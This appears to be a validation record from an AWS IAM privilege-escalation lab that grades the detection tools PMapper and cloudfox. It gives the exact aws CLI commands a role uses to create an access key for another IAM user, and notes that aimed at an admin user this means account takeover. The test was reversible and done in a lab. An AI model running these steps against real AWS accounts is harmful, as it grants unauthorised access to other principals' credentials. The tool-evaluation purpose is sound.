# `privesc4-CreateAccessKey--role` — D, exercised live (reversible)

- **Class:** `privesc` · **Category:** D reported by PMapper (rubric §6, ≥3 confirmed)
- **Date validated:** 2026-08-31 · **Context:** `admin` (`user/iamadmin`)
- **Claim under test:** the principal can mint an access key for another IAM user,
  giving it that user's credentials. Enabling permission: `iam:CreateAccessKey`.

## Commands and outcomes

Account ID redacted to `000000000000`; access-key IDs masked. The primitive was
exercised for real against a neutral lab user and then reverted — the account is
back to its original state.

```
# target starts with exactly one key
$ aws iam list-access-keys --user-name fn1-privesc3-partial-user --profile personal \
    --query 'AccessKeyMetadata[].Status'
[ "Active" ]

# assume the privesc4 role
$ aws sts assume-role --role-arn arn:aws:iam::000000000000:role/privesc4-CreateAccessKey-role \
    --role-session-name p4val --profile personal
$ aws sts get-caller-identity --query Arn   # with assumed creds
arn:aws:sts::000000000000:assumed-role/privesc4-CreateAccessKey-role/p4val

# THE ESCALATION PRIMITIVE: mint a key for another user
$ aws iam create-access-key --user-name fn1-privesc3-partial-user
=> CREATED key AKIA<REDACTED-NEW> for fn1-privesc3-partial-user, status Active

# the privesc4 role can create but NOT delete keys (scoped to CreateAccessKey only)
$ aws iam delete-access-key --user-name fn1-privesc3-partial-user --access-key-id AKIA<REDACTED-NEW>
An error occurred (AccessDenied) ... not authorized to perform: iam:DeleteAccessKey ...

# cleanup performed as iamadmin
$ aws iam delete-access-key --user-name fn1-privesc3-partial-user \
    --access-key-id AKIA<REDACTED-NEW> --profile personal
DELETED

# target restored to its original single key
$ aws iam list-access-keys --user-name fn1-privesc3-partial-user --profile personal \
    --query 'AccessKeyMetadata[].Status'
[ "Active" ]
```

## Verdict

**Confirmed.** The privesc4 role successfully created a *new, active* access key
for a different user — usable credentials for that principal. It could not delete
the key it created (the grant is `iam:CreateAccessKey` only), which is itself a
faithful property of the mechanism; cleanup was done as iamadmin and the account
is back to one key on the target. Pointed at an admin user (e.g. iamadmin) this is
a direct account takeover.

## Tool behaviour

- **PMapper (admin-flagged):** **D.**
  > `role/privesc4-CreateAccessKey-role can escalate privileges by accessing the
  > administrative principal user/fn2-exploitableResourceConstraint-user: ... can
  > create access keys to authenticate as user/fn2-exploitableResourceConstraint-user`
  (PMapper picks a reachable admin target; the primitive is the same one validated here.)
- **cloudfox (admin-default):** `iam:CreateAccessKey` bound to the principal
  appears in the raw `permissions` dump; not surfaced as an escalation path in
  `iam-simulator`. (Grading is Phase 4.)
